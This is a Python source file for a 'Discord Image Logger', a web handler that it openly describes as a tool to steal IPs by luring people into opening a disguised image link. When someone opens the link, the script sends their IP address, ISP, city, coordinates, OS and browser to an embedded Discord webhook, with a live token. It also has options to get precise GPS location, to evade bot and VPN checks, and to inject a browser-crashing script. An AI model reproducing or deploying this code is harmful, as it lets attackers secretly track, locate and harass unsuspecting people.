# Image Logger
# By Team C00lB0i/C00lB0i | https://github.com/OverPowerC

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "C00lB0i"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1438547287826759851/FS9C4Lr0x8rrtr63ETZGC5sqxFwz9ZUcAzOglS3Pnyq5pw8Wwwb5jlHd195nVMcuX-Jh",
    "image": "https://media.tenor.com/wkWmvScujeQAAAAe/discord-loading-screen.png", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger Bot", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": True, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/OverPowerC/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "you have been loged, have a nice day!", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": True, # Redirect to a webpage?
        "page": "data:image/png;base64,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" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/OverPower/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
